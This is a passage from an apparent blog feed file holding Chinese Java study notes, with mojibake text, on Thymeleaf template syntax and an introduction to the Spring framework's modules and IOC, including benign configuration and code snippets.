class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304919.png"></p><h3 id="4-2-1-Thymeleaf-è¯­æ³•å­¦ä¹ "><a href="#4-2-1-Thymeleaf-è¯­æ³•å­¦ä¹ " class="headerlink" title="4.2.1 Thymeleaf è¯­æ³•å­¦ä¹ "></a>4.2.1 Thymeleaf è¯­æ³•å­¦ä¹ </h3><p><a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><h4 id="yaml-é…ç½®ï¼š"><a href="#yaml-é…ç½®ï¼š" class="headerlink" title="yaml é…ç½®ï¼š"></a>yaml é…ç½®ï¼š</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">thymeleaf:</span><br>    <span class="hljs-attr">prefix:</span> <span class="hljs-string">classpath:/templates/</span><span class="hljs-comment">#æŒ‡å®šæ¨¡æ¿æ‰€åœ¨çš„ç›®å½•</span><br>    <span class="hljs-attr">check-template-location:</span> <span class="hljs-literal">true</span><span class="hljs-comment">#æ£€æŸ¥æ¨¡æ¿è·¯å¾„æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><span class="hljs-comment">#æ˜¯å¦ç¼“å­˜ï¼Œå¼€å‘æ¨¡å¼ä¸‹è®¾ç½®ä¸ºfalseï¼Œé¿å…æ”¹äº†æ¨¡æ¿è¿˜è¦é‡å¯æœåŠ¡å™¨ï¼Œçº¿ä¸Šè®¾ç½®ä¸ºtrueï¼Œå¯ä»¥æé«˜æ€§èƒ½ã€‚</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.html</span><span class="hljs-comment">#è¡¨ç¤ºæ¨¡æ¿æ–‡ä»¶çš„åç¼€</span><br>    <span class="hljs-attr">encoding:</span> <span class="hljs-string">UTF-8</span><span class="hljs-comment">#è®¾ç½®æ¨¡æ¿æ–‡ä»¶çš„å­—ç¬¦ç¼–ç </span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><span class="hljs-comment">#å®šæ¸²æŸ“åè¿”å›çš„ HTTP å“åº”ç±»å‹</span><br>    <span class="hljs-attr">mode:</span> <span class="hljs-string">HTML5</span><span class="hljs-comment">#Thymeleaf æ¨¡æ¿è§£ææ¨¡å¼</span><br></code></pre></td></tr></table></figure><h4 id="th-å±æ€§"><a href="#th-å±æ€§" class="headerlink" title="th å±æ€§"></a><font style="color:rgba(0, 0, 0, 0.9);">th å±æ€§</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304599.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306398.png"></p><ol><li><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);"> ï¼šè®¾ç½®å½“å‰å…ƒç´ çš„æ–‡æœ¬å†…å®¹ï¼Œç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰</font><strong><font style="color:rgb(77, 77, 77);">th:utext</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºå‰è€…ä¸ä¼šè½¬ä¹‰htmlæ ‡ç­¾ï¼Œåè€…ä¼šã€‚ä¼˜å…ˆçº§ä¸é«˜ï¼šorder&#x3D;7</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">ï¼šè®¾ç½®å½“å‰å…ƒç´ çš„valueå€¼ï¼Œç±»ä¼¼ä¿®æ”¹æŒ‡å®šå±æ€§çš„è¿˜æœ‰</font><strong><font style="color:rgb(77, 77, 77);">th:src</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œ</font><strong><font style="color:rgb(77, 77, 77);">th:href</font></strong><font style="color:rgb(77, 77, 77);">ã€‚ä¼˜å…ˆçº§ä¸é«˜ï¼šorder&#x3D;6</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:each</font></strong><font style="color:rgb(77, 77, 77);">ï¼šéå†å¾ªç¯å…ƒç´ ï¼Œå’Œ</font><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);">æˆ–</font><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">ä¸€èµ·ä½¿ç”¨ã€‚æ³¨æ„è¯¥å±æ€§ä¿®é¥°çš„æ ‡ç­¾ä½ç½®ï¼Œè¯¦ç»†å¾€åçœ‹ã€‚ä¼˜å…ˆçº§å¾ˆé«˜ï¼šorder&#x3D;2</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:if</font></strong><font style="color:rgb(77, 77, 77);">ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œç±»ä¼¼çš„è¿˜æœ‰</font><strong><font style="color:rgb(77, 77, 77);">th:unless</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œ</font><strong><font style="color:rgb(77, 77, 77);">th:switch</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œ</font><strong><font style="color:rgb(77, 77, 77);">th:case</font></strong><font style="color:rgb(77, 77, 77);">ã€‚ä¼˜å…ˆçº§è¾ƒé«˜ï¼šorder&#x3D;3</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">ï¼šä»£ç å—å¼•å…¥ï¼Œç±»ä¼¼çš„è¿˜æœ‰</font><strong><font style="color:rgb(77, 77, 77);">th:replace</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œ</font><strong><font style="color:rgb(77, 77, 77);">th:include</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œä¸‰è€…çš„åŒºåˆ«è¾ƒå¤§ï¼Œè‹¥ä½¿ç”¨ä¸æ°å½“ä¼šç ´åhtmlç»“æ„ï¼Œå¸¸ç”¨äºå…¬å…±ä»£ç å—æå–çš„åœºæ™¯ã€‚ä¼˜å…ˆçº§æœ€é«˜ï¼šorder&#x3D;1</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:fragment</font></strong><font style="color:rgb(77, 77, 77);">ï¼šå®šä¹‰ä»£ç å—ï¼Œæ–¹ä¾¿è¢«</font><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">å¼•ç”¨ã€‚ä¼˜å…ˆçº§æœ€ä½ï¼šorder&#x3D;8</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:object</font></strong><font style="color:rgb(77, 77, 77);">ï¼šå£°æ˜å˜é‡ï¼Œä¸€èˆ¬å’Œ*{}ä¸€èµ·é…åˆä½¿ç”¨ï¼Œè¾¾åˆ°å·æ‡’çš„æ•ˆæœã€‚ä¼˜å…ˆçº§ä¸€èˆ¬ï¼šorder&#x3D;4</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:attr</font></strong><font style="color:rgb(77, 77, 77);">ï¼šä¿®æ”¹ä»»æ„å±æ€§ï¼Œå®é™…å¼€å‘ä¸­ç”¨çš„è¾ƒå°‘ï¼Œå› ä¸ºæœ‰ä¸°å¯Œçš„</font><font style="color:rgb(78, 161, 219) !important;">å…¶ä»–</font><font style="color:rgb(77, 77, 77);">thå±æ€§å¸®å¿™ï¼Œç±»ä¼¼çš„è¿˜æœ‰</font><strong><font style="color:rgb(77, 77, 77);">th:attrappend</font></strong><font style="color:rgb(77, 77, 77);">ï¼Œ</font><strong><font style="color:rgb(77, 77, 77);">th:attrprepend</font></strong><font style="color:rgb(77, 77, 77);">ã€‚ä¼˜å…ˆçº§ä¸€èˆ¬ï¼šorder&#x3D;5</font></li></ol><p><font style="color:rgb(79, 79, 79);"></font></p><h4 id="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"><a href="#æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"></a><font style="color:rgb(79, 79, 79);">æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•</font></h4><ul><li><font style="color:rgb(51, 51, 51);">Simple expressions:</font><ul><li><font style="color:rgb(51, 51, 51);">Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;${...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Selection Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;*{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Message Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;#{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Link URL Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;@{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Fragment Expressions: </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;~{...}&lt;/font&gt;**</code></li></ul></li></ul><h5 id="â€¦-ä»£ç å—è¡¨è¾¾å¼"><a href="#â€¦-ä»£ç å—è¡¨è¾¾å¼" class="headerlink" title="~{â€¦} ä»£ç å—è¡¨è¾¾å¼"></a><font style="color:rgb(77, 77, 77);">~{â€¦} ä»£ç å—è¡¨è¾¾å¼</font></h5><ul><li><font style="color:rgb(77, 77, 77);">æ¨èï¼š</font><code>~{templatename::fragmentname}</code></li><li><font style="color:rgb(77, 77, 77);">æ”¯æŒï¼š</font><code>~{templatename::#id}</code></li></ul><p><font style="color:rgb(77, 77, 77);">templatenameï¼šæ¨¡ç‰ˆåï¼ŒThymeleafä¼šæ ¹æ®æ¨¡ç‰ˆåè§£æå®Œæ•´è·¯å¾„ï¼š</font><code>/resources/templates/templatename.html</code><font style="color:rgb(77, 77, 77);">ï¼Œè¦æ³¨æ„æ–‡ä»¶çš„è·¯å¾„ã€‚</font></p><p><font style="color:rgb(77, 77, 77);">fragmentnameï¼šç‰‡æ®µåï¼ŒThymeleafé€šè¿‡th:fragmentå£°æ˜å®šä¹‰ä»£ç å—ï¼Œå³ï¼š</font><code>th:fragment=&quot;fragmentname&quot;</code></p><p><font style="color:rgb(77, 77, 77);">idï¼šHTMLçš„idé€‰æ‹©å™¨ï¼Œä½¿ç”¨æ—¶è¦åœ¨å‰é¢åŠ ä¸Š#å·ï¼Œä¸æ”¯æŒclassé€‰æ‹©å™¨ã€‚</font></p><h5 id="â€¦-æ¶ˆæ¯è¡¨è¾¾å¼"><a href="#â€¦-æ¶ˆæ¯è¡¨è¾¾å¼" class="headerlink" title="#{â€¦} æ¶ˆæ¯è¡¨è¾¾å¼"></a><font style="color:rgb(77, 77, 77);">#{â€¦} æ¶ˆæ¯è¡¨è¾¾å¼</font></h5><h5 id="â€¦-é“¾æ¥è¡¨è¾¾å¼"><a href="#â€¦-é“¾æ¥è¡¨è¾¾å¼" class="headerlink" title="@{â€¦} é“¾æ¥è¡¨è¾¾å¼"></a><font style="color:rgb(77, 77, 77);">@{â€¦} é“¾æ¥è¡¨è¾¾å¼</font></h5><p><font style="color:rgb(77, 77, 77);">é“¾æ¥è¡¨è¾¾å¼å¥½å¤„ï¼šä¸ç®¡æ˜¯é™æ€èµ„æºçš„å¼•ç”¨ï¼Œformè¡¨å•çš„è¯·æ±‚ï¼Œå‡¡æ˜¯é“¾æ¥éƒ½å¯ä»¥ç”¨@{â€¦} ã€‚è¿™æ ·å¯ä»¥åŠ¨æ€è·å–é¡¹ç›®è·¯å¾„ï¼Œå³ä¾¿é¡¹ç›®åå˜äº†ï¼Œä¾ç„¶å¯ä»¥æ­£å¸¸è®¿é—®ã€‚</font></p><p><strong><font style="color:rgb(77, 77, 77);">é“¾æ¥è¡¨è¾¾å¼ç»“æ„</font></strong><font style="color:rgb(77, 77, 77);">:</font></p><ul><li><font style="color:rgb(77, 77, 77);">æ— å‚ï¼š@{&#x2F;xxx}</font></li><li><font style="color:rgb(77, 77, 77);">æœ‰å‚ï¼š@{&#x2F;xxx(k1&#x3D;v1,k2&#x3D;v2)} å¯¹åº”urlç»“æ„ï¼šxxx?k1&#x3D;v1&amp;k2&#x3D;v2</font></li><li><font style="color:rgb(77, 77, 77);">å¼•å…¥æœ¬åœ°èµ„æºï¼š@{&#x2F;é¡¹ç›®æœ¬åœ°çš„èµ„æºè·¯å¾„}</font></li><li><font style="color:rgb(77, 77, 77);">å¼•å…¥å¤–éƒ¨èµ„æºï¼š@{&#x2F;webjars&#x2F;èµ„æºåœ¨jaråŒ…ä¸­çš„è·¯å¾„}</font></li></ul><h5 id="â€¦-å˜é‡è¡¨è¾¾å¼"><a href="#â€¦-å˜é‡è¡¨è¾¾å¼" class="headerlink" title="${â€¦}å˜é‡è¡¨è¾¾å¼"></a><font style="color:rgb(77, 77, 77);">${â€¦}å˜é‡è¡¨è¾¾å¼</font></h5><p>å˜é‡è¡¨è¾¾å¼åŠŸèƒ½ï¼š</p><ul><li>å¯ä»¥è·å–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•</li><li>å¯ä»¥ä½¿ç”¨ctxï¼Œvarsï¼Œlocaleï¼Œrequestï¼Œresponseï¼Œsessionï¼ŒservletContextå†…ç½®å¯¹è±¡</li><li>å¯ä»¥ä½¿ç”¨datesï¼Œnumbersï¼Œstringsï¼Œobjectsï¼Œarraysï¼Œlistsï¼Œsetsï¼Œmapsç­‰å†…ç½®æ–¹æ³•ï¼ˆé‡ç‚¹ä»‹ç»ï¼‰</li></ul><p>å¸¸ç”¨çš„å†…ç½®å¯¹è±¡ï¼š</p><ul><li>ctx ï¼šä¸Šä¸‹æ–‡å¯¹è±¡ã€‚</li><li>vars ï¼šä¸Šä¸‹æ–‡å˜é‡ã€‚</li><li>localeï¼šä¸Šä¸‹æ–‡çš„è¯­è¨€ç¯å¢ƒã€‚</li><li>requestï¼šï¼ˆä»…åœ¨webä¸Šä¸‹æ–‡ï¼‰çš„ HttpServletRequest å¯¹è±¡ã€‚</li><li>responseï¼šï¼ˆä»…åœ¨webä¸Šä¸‹æ–‡ï¼‰çš„ HttpServletResponse å¯¹è±¡ã€‚</li><li>sessionï¼šï¼ˆä»…åœ¨webä¸Šä¸‹æ–‡ï¼‰çš„ HttpSession å¯¹è±¡ã€‚</li><li>servletContextï¼šï¼ˆä»…åœ¨webä¸Šä¸‹æ–‡ï¼‰çš„ ServletContext å¯¹è±¡</li></ul><p>å¸¸ç”¨çš„å†…ç½®æ–¹æ³•:</p><ul><li>stringsï¼šå­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•ï¼Œå¸¸ç”¨çš„Javaæ–¹æ³•å®ƒéƒ½æœ‰ã€‚æ¯”å¦‚ï¼šequalsï¼ŒequalsIgnoreCaseï¼Œlengthï¼Œtrimï¼ŒtoUpperCaseï¼ŒtoLowerCaseï¼ŒindexOfï¼Œsubstringï¼Œreplaceï¼ŒstartsWithï¼ŒendsWithï¼Œcontainsï¼ŒcontainsIgnoreCaseç­‰</li><li>numbersï¼šæ•°å€¼æ ¼å¼åŒ–æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šformatDecimalç­‰</li><li>boolsï¼šå¸ƒå°”æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šisTrueï¼ŒisFalseç­‰</li><li>arraysï¼šæ•°ç»„æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼štoArrayï¼Œlengthï¼ŒisEmptyï¼Œcontainsï¼ŒcontainsAllç­‰</li><li>listsï¼Œsetsï¼šé›†åˆæ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼štoListï¼Œsizeï¼ŒisEmptyï¼Œcontainsï¼ŒcontainsAllï¼Œsortç­‰</li><li>mapsï¼šå¯¹è±¡æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šsizeï¼ŒisEmptyï¼ŒcontainsKeyï¼ŒcontainsValueç­‰</li><li>datesï¼šæ—¥æœŸæ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šformatï¼Œyearï¼Œmonthï¼Œhourï¼ŒcreateNowç­‰</li></ul><h5 id="â€¦-é€‰æ‹©å˜é‡è¡¨è¾¾å¼"><a href="#â€¦-é€‰æ‹©å˜é‡è¡¨è¾¾å¼" class="headerlink" title="*{â€¦} é€‰æ‹©å˜é‡è¡¨è¾¾å¼"></a>*{â€¦} é€‰æ‹©å˜é‡è¡¨è¾¾å¼</h5><h2 id="4-3-MVCè‡ªåŠ¨é…ç½®åŸç†"><a href="#4-3-MVCè‡ªåŠ¨é…ç½®åŸç†" class="headerlink" title="4.3 MVCè‡ªåŠ¨é…ç½®åŸç†"></a>4.3 MVCè‡ªåŠ¨é…ç½®åŸç†</h2><p><a href="https://springdoc.cn/spring-boot/web.html#web.servlet">https://springdoc.cn/spring-boot/web.html#web.servlet</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2025/08/12/Spring/"/>
    <url>/2025/08/12/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="1ã€Springç®€ä»‹"><a href="#1ã€Springç®€ä»‹" class="headerlink" title="1ã€Springç®€ä»‹"></a>1ã€Springç®€ä»‹</h1><p><a href="https://spring.io/">Spring å®˜ç½‘</a></p><p><a href="https://docs.spring.io/spring-framework/docs/5.2.0.RELEASE/spring-framework-reference/core.html#spring-core">Spring 5.2.0 å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/spring-projects/spring-framework">GitHub - spring-projects&#x2F;spring-framework: Spring Framework</a></p><p><a href="https://mvnrepository.com/artifact/org.springframework/spring-webmvc">spring-webmvc</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.0.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-1ã€ä¼˜ç‚¹"><a href="#1-1ã€ä¼˜ç‚¹" class="headerlink" title="1.1ã€ä¼˜ç‚¹"></a>1.1ã€ä¼˜ç‚¹</h2><ul><li>Springæ˜¯ä¸€ä¸ªå¼€æºçš„å…è´¹çš„æ¡†æ¶</li><li>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€éå…¥ä¾µå¼çš„æ¡†æ¶</li><li>æ§åˆ¶åè½¬ï¼ˆIOCï¼‰ï¼Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰</li><li>æ”¯æŒäº‹ç‰©çš„å¤„ç†ï¼Œå¯¹æ¡†æ¶æ•´åˆçš„æ”¯æŒ</li></ul><p>æ€»ç»“ä¸€å¥è¯ï¼šSpringå°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ§åˆ¶åè½¬ï¼ˆIOCï¼‰å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„æ¡†æ¶</p><h2 id="1-2ã€ç»„æˆ"><a href="#1-2ã€ç»„æˆ" class="headerlink" title="1.2ã€ç»„æˆ"></a>1.2ã€ç»„æˆ</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749844.gif" alt="img"></p><p><strong>æ ¸å¿ƒå®¹å™¨ï¼ˆSpring Coreï¼‰</strong></p><p>æ ¸å¿ƒå®¹å™¨æä¾›Springæ¡†æ¶çš„åŸºæœ¬åŠŸèƒ½ã€‚Springä»¥beançš„æ–¹å¼ç»„ç»‡å’Œç®¡ç†Javaåº”ç”¨ä¸­çš„å„ä¸ªç»„ä»¶åŠå…¶å…³ç³»ã€‚Springä½¿ç”¨BeanFactoryæ¥äº§ç”Ÿå’Œç®¡ç†Beanï¼Œå®ƒæ˜¯å·¥å‚æ¨¡å¼çš„å®ç°ã€‚BeanFactoryä½¿ç”¨æ§åˆ¶åè½¬(IoC)æ¨¡å¼å°†åº”ç”¨çš„é…ç½®å’Œä¾èµ–æ€§è§„èŒƒä¸å®é™…çš„åº”ç”¨ç¨‹åºä»£ç åˆ†å¼€ã€‚</p><p><strong>åº”ç”¨ä¸Šä¸‹æ–‡ï¼ˆSpring Contextï¼‰</strong></p><p>Springä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå‘Springæ¡†æ¶æä¾›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚Springä¸Šä¸‹æ–‡åŒ…æ‹¬ä¼ä¸šæœåŠ¡ï¼Œå¦‚JNDIã€EJBã€ç”µå­é‚®ä»¶ã€å›½é™…åŒ–ã€æ ¡éªŒå’Œè°ƒåº¦åŠŸèƒ½ã€‚</p><p><strong>Springé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆSpring AOPï¼‰</strong></p><p>é€šè¿‡é…ç½®ç®¡ç†ç‰¹æ€§ï¼ŒSpring AOP æ¨¡å—ç›´æ¥å°†é¢å‘æ–¹é¢çš„ç¼–ç¨‹åŠŸèƒ½é›†æˆåˆ°äº† Springæ¡†æ¶ä¸­ã€‚æ‰€ä»¥ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ Springæ¡†æ¶ç®¡ç†çš„ä»»ä½•å¯¹è±¡æ”¯æŒ AOPã€‚Spring AOP æ¨¡å—ä¸ºåŸºäº Spring çš„åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡æä¾›äº†äº‹åŠ¡ç®¡ç†æœåŠ¡ã€‚é€šè¿‡ä½¿ç”¨ Spring AOPï¼Œä¸ç”¨ä¾èµ– EJB ç»„ä»¶ï¼Œå°±å¯ä»¥å°†å£°æ˜æ€§äº‹åŠ¡ç®¡ç†é›†æˆåˆ°åº”ç”¨ç¨‹åºä¸­ã€‚</p><p><strong>JDBCå’ŒDAOæ¨¡å—ï¼ˆSpring DAOï¼‰</strong></p><p>JDBCã€DAOçš„æŠ½è±¡å±‚æä¾›äº†æœ‰æ„ä¹‰çš„å¼‚å¸¸å±‚æ¬¡ç»“æ„ï¼Œå¯ç”¨è¯¥ç»“æ„æ¥ç®¡ç†å¼‚å¸¸å¤„ç†ï¼Œå’Œä¸åŒæ•°æ®åº“ä¾›åº”å•†æ‰€æŠ›å‡ºçš„é”™è¯¯ä¿¡æ¯ã€‚å¼‚å¸¸å±‚æ¬¡ç»“æ„ç®€åŒ–äº†é”™è¯¯å¤„ç†ï¼Œå¹¶ä¸”æå¤§çš„é™ä½äº†éœ€è¦ç¼–å†™çš„ä»£ç æ•°é‡ï¼Œæ¯”å¦‚æ‰“å¼€å’Œå…³é—­é“¾æ¥ã€‚</p><p><strong>å¯¹è±¡å®ä½“æ˜ å°„ï¼ˆSpring ORMï¼‰</strong></p><p>Springæ¡†æ¶æ’å…¥äº†è‹¥å¹²ä¸ªORMæ¡†æ¶ï¼Œä»è€Œæä¾›äº†ORMå¯¹è±¡çš„å…³ç³»å·¥å…·ï¼Œå…¶ä¸­åŒ…æ‹¬äº†Hibernateã€JDOå’Œ IBatis SQL Mapç­‰ï¼Œæ‰€æœ‰è¿™äº›éƒ½éµä»Springçš„é€šç”¨äº‹ç‰©å’ŒDAOå¼‚å¸¸å±‚æ¬¡ç»“æ„ã€‚</p><p><strong>Webæ¨¡å—ï¼ˆSpring Webï¼‰</strong></p><p>Webä¸Šä¸‹æ–‡æ¨¡å—å»ºç«‹åœ¨åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡æ¨¡å—ä¹‹ä¸Šï¼Œä¸ºåŸºäºwebçš„åº”ç”¨ç¨‹åºæä¾›äº†ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥Springæ¡†æ¶æ”¯æŒä¸Strutsé›†æˆï¼Œwebæ¨¡å—è¿˜ç®€åŒ–äº†å¤„ç†å¤šéƒ¨åˆ†è¯·æ±‚ä»¥åŠå°†è¯·æ±‚å‚æ•°ç»‘å®šåˆ°åŸŸå¯¹è±¡çš„å·¥ä½œã€‚</p><p><strong>MVCæ¨¡å—ï¼ˆSpring Web MVCï¼‰</strong></p><p>MVCæ¡†æ¶æ˜¯ä¸€ä¸ªå…¨åŠŸèƒ½çš„æ„å»ºWebåº”ç”¨ç¨‹åºçš„MVCå®ç°ã€‚é€šè¿‡ç­–ç•¥æ¥å£ï¼ŒMVCæ¡†æ¶å˜æˆä¸ºé«˜åº¦å¯é…ç½®çš„ã€‚MVCå®¹çº³äº†å¤§é‡è§†å›¾æŠ€æœ¯ï¼Œå…¶ä¸­åŒ…æ‹¬JSPã€POIç­‰ï¼Œæ¨¡å‹æ¥æœ‰JavaBeanæ¥æ„æˆï¼Œå­˜æ”¾äºmå½“ä¸­ï¼Œè€Œè§†å›¾æ˜¯ä¸€ä¸ªè¡—å£ï¼Œè´Ÿè´£å®ç°æ¨¡å‹ï¼Œæ§åˆ¶å™¨è¡¨ç¤ºé€»è¾‘ä»£ç ï¼Œç”±cçš„äº‹æƒ…ã€‚Springæ¡†æ¶çš„åŠŸèƒ½å¯ä»¥ç”¨åœ¨ä»»ä½•J2EEæœåŠ¡å™¨å½“ä¸­ï¼Œå¤§å¤šæ•°åŠŸèƒ½ä¹Ÿé€‚ç”¨äºä¸å—ç®¡ç†çš„ç¯å¢ƒã€‚Springçš„æ ¸å¿ƒè¦ç‚¹å°±æ˜¯æ”¯æŒä¸ç»‘å®šåˆ°ç‰¹å®šJ2EEæœåŠ¡çš„å¯é‡ç”¨ä¸šåŠ¡å’Œæ•°æ®çš„è®¿é—®çš„å¯¹è±¡ï¼Œæ¯«æ— ç–‘é—®è¿™æ ·çš„å¯¹è±¡å¯ä»¥åœ¨ä¸åŒçš„J2EEç¯å¢ƒï¼Œç‹¬ç«‹åº”ç”¨ç¨‹åºå’Œæµ‹è¯•ç¯å¢ƒä¹‹é—´é‡ç”¨ã€‚</p><h2 id="1-3ã€æ‹“å±•"><a href="#1-3ã€æ‹“å±•" class="headerlink" title="1.3ã€æ‹“å±•"></a>1.3ã€æ‹“å±•</h2><p>ç°ä»£åŒ–çš„Javaå¼€å‘ï¼Œè¯´ç™½å°±æ˜¯åŸºäº Spring çš„å¼€å‘</p><ul><li><p>Spring Boot</p></li><li><ul><li>ä¸€ä¸ªå¿«é€Ÿå¼€å‘çš„è„šæ‰‹æ¶</li><li>åŸºäºSpring Bootå¯ä»¥å¿«é€Ÿçš„å¼€å‘å•ä¸ªå¾®æœåŠ¡</li><li>çº¦å®šå¤§äºé…ç½®</li></ul></li><li><p>Spring Cloud</p></li><li><ul><li>Spring Cloud æ˜¯åŸºäºSpring Boot å®ç°çš„</li></ul></li></ul><h1 id="2ã€IOC-å®¹å™¨"><a href="#2ã€IOC-å®¹å™¨" class="headerlink" title="2ã€IOC å®¹å™¨"></a>2ã€IOC å®¹å™¨</h1><h2 id="2-1-IOC-ç†è®ºæ¨å¯¼"><a href="#2-1-IOC-ç†è®ºæ¨å¯¼" class="headerlink" title="2.1 IOC ç†è®ºæ¨å¯¼"></a>2.1 IOC ç†è®ºæ¨å¯¼</h2><h3 id="æ¡ˆä¾‹ä¸€ï¼š"><a href="#æ¡ˆä¾‹ä¸€ï¼š" class="headerlink" title="æ¡ˆä¾‹ä¸€ï¼š"></a>æ¡ˆä¾‹ä¸€ï¼š</h3><ol><li>UserDao æ¥å£</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserDaoImpl å®ç°ç±»</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 